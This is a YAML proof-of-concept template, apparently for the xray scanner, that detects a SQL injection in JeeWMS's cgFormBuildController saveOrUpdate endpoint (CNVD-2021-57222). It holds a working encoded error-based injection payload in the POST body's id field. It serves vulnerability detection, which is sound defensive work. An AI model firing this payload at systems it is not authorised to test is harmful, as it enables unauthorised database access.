name: poc-yaml-jeewms-cgformbuildcontroller-sqli
binding: 817e0f5d-62e1-46b5-9ffb-d682359d645c
manual: true
detail:
    author: junfei.song@chaitin.com
    links:
        - https://www.cnvd.org.cn/flaw/show/CNVD-2021-57222
    vulnerability:
        id: CT-529783
        level: high
transport: http
set:
    r1: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: ^/jeewms/cgFormBuildController.do?saveOrUpdate
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
            body: create_by=&create_date=&create_name=&id=%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cmd5%28{{r1}}%29%29%29and%27&sys_company_code=&sys_org_code=&sysp_type_code=1&sysp_type_name=1&tableName=ba_sysp_type&update_by=&update_date=&update_name=
        expression: response.body.bcontains(bytes(md5(string(r1))))
expression: r0()
